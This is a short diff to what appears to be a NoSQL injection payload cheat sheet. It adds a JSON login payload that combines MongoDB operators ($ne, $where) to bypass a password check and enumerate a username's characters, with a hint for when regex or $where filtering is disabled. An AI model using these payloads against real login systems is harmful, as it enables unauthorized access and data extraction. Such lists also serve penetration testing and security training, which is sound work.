@@ -60,6 +60,12 @@
 #### JSON
 
 - `{param: {$regex: '^XYZ.*$}}`
+in case $where or regex disable you can use this but all params must be correct
+- {
+  "username": "carlos",
+  "password": { "$ne": "asd" },
+  "$where": "this.username[0] == 'c'"
+}`
 
 ### Server-Side JavaScript Injection Payloads:
 
